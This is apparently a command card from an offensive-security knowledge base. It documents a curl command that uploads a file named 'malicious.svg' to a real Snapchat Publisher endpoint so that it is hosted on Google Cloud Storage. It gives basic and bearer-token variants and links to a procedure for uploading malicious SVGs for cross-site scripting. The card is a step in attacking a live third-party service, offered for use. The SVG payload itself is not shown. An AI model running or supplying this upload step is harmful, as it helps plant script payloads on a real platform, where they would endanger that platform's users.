---
data: >-
  curl -X POST 'https://snappublisher.snapchat.com/snaps/create/new' -F
  'file=@malicious.svg' -H 'Content-Type: multipart/form-data'
tags:
  - upload
  - web
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 7b6806ea-05cf-4a73-b8f7-52f9de49277c
created_at: '2025-12-13T09:01:26.631Z'
updated_at: '2025-12-13T09:01:26.631Z'
verified: false
validated: true
submitted: true
---
# Curl Upload SVG

## Command

```bash
curl -X POST 'https://snappublisher.snapchat.com/snaps/create/new' -F 'file=@malicious.svg' -H 'Content-Type: multipart/form-data'
```

## Description

Uploads a file (e.g., malicious SVG) to Snapchat Publisher for hosting on GCS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-F 'file=@path'` | File to upload | Yes |
| `-H 'Content-Type'` | Multipart form data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://snappublisher.snapchat.com/snaps/create/new' -F 'file=@image.svg'
```

### Advanced Usage

```bash
curl -X POST 'https://snappublisher.snapchat.com/snaps/create/new' -F 'file=@malicious.svg' -H 'Authorization: Bearer token'
```

## Expected Output

Upload success response with hosted URL.

## Related

- [[commands/curl-sso-request]]
- [[procedures/Upload-Malicious-SVG-for-XSS]]
